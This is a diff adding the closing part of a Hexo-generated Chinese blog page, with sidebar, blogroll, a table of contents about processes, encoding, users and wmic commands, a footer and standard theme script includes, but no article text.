+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image" src="/images/avatar.jpg" alt="WBGlIl">
+            
+              <p class="site-author-name" itemprop="name">WBGlIl</p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">39</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">20</span>
+                  <span class="site-state-item-name">分类</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">30</span>
+                  <span class="site-state-item-name">标签</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+
+          
+          
+
+          
+          
+            <div class="links-of-blogroll motion-element links-of-blogroll-block">
+              <div class="links-of-blogroll-title">
+                <i class="fa  fa-fw fa-link"></i>
+                大佬们的博客
+              </div>
+              <ul class="links-of-blogroll-list">
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://www.sariel.top/" title="只因不值得" target="_blank">只因不值得</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://422926799.github.io/" title="九世" target="_blank">九世</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://www.ggsec.cn/" title="Demon" target="_blank">Demon</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://www.secist.com/" title="即刻安全" target="_blank">即刻安全</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://nek0y4nsu.github.io/" title="Yansu" target="_blank">Yansu</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://blue-bird1.github.io/" title="青鸟" target="_blank">青鸟</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://qwq.moe/" title="蚊子の博客" target="_blank">蚊子の博客</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://9bie.org/" title="biebie" target="_blank">biebie</a>
+                  </li>
+                
+              </ul>
+            </div>
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#进程"><span class="nav-number">1.</span> <span class="nav-text">进程</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#编码"><span class="nav-number">2.</span> <span class="nav-text">编码</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#用户"><span class="nav-number">3.</span> <span class="nav-text">用户</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#系统"><span class="nav-number">4.</span> <span class="nav-text">系统</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#wmic命令"><span class="nav-number">4.1.</span> <span class="nav-text">wmic命令</span></a></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2022</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">WBGlIl</span>
+
+  
+</div>
+
+
+  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Gemini</a> v5.1.4</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/canvas-nest/canvas-nest.min.js"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+  <script type="text/javascript" src="/js/src/clicklove.js"></script>
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"jsonPath":"/live2dw/assets/koharu.model.json"},"display":{"position":"left","width":150,"height":300},"mobile":{"show":true},"react":{"opacity":0.7},"log":false});</script></body>
+</html>
+
+
